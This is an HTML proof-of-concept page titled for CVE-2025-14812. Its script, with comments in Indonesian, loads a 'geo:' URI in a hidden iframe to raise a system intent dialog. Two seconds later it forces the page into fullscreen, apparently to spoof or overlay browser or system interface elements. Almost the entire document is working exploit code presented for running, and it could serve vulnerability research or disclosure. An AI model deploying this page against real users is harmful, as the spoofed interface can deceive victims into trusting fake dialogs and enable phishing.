<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CVE-2025-14812 Enhanced PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="execBtn">INITIALIZE ENHANCED SPOOF</button>
      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = function () {
        statusInfo.innerText = "Status: Deploying context vector & triggering intent...";
        this.style.display = "none";

        try {
          // Membangun elemen iframe pemicu skema URI secara dinamis dan bersih
          let spoofFrame = document.createElement("iframe");
          spoofFrame.style.display = "none";
          spoofFrame.src = "geo:0,0?q=apple.com";
          
          // Menyematkan frame ke body untuk langsung mengeksekusi intent dialog sistem
          document.body.appendChild(spoofFrame);
          statusInfo.innerText = "Status: Intent dispatched. Locking view in 2 seconds...";

          // Eksekusi penguncian Fullscreen secara presisi setelah jeda 2 detik
          setTimeout(() => {
            let docElement = document.documentElement;
            
            let requestFS = docElement.requestFullscreen || 
                            docElement.webkitRequestFullscreen || 
                            docElement.mozRequestFullScreen || 
                            docElement.msRequestFullscreen;

            if (requestFS) {
              requestFS.call(docElement).catch((err) => {
                console.debug("Fullscreen execution deferred:", err.message);
              });
            }
            
            statusInfo.innerText = "Status: Viewport locked and secured.";
          }, 2000);

        } catch (err) {
          statusInfo.innerText = "Status: Critical execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
